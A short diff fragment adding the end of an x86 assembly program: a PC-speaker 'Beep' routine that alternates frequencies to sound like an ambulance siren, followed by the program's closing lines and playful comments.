+   out 42h,al                                                                 
+                                                                              
+   xor byte ptr [Freq],0Ch   ; Choose another frequency for next beep         
+                             ; It sounds like an ambulance  X-DDD             
+                                                                              
+   in al,61h                                                                  
+   or al,3                                                                    
+   out 61h,al                                                                 
+                                                                              
+   mov ecx,1000000h                                                           
+                                                                              
+   loop $                                                                     
+                                                                              
+   and al,0FCh                                                                
+   out 61h,al                                                                 
+                                                                              
+   popad                                                                      
+                                                                              
+   ret                                                                        
+                                                                              
+Beep endp                                                                     
+                                                                              
+;===================================================================          
+;===================================================================          
+                                                                              
+ends                                                                          
+end Start   ; yeah! its the end!  :-)
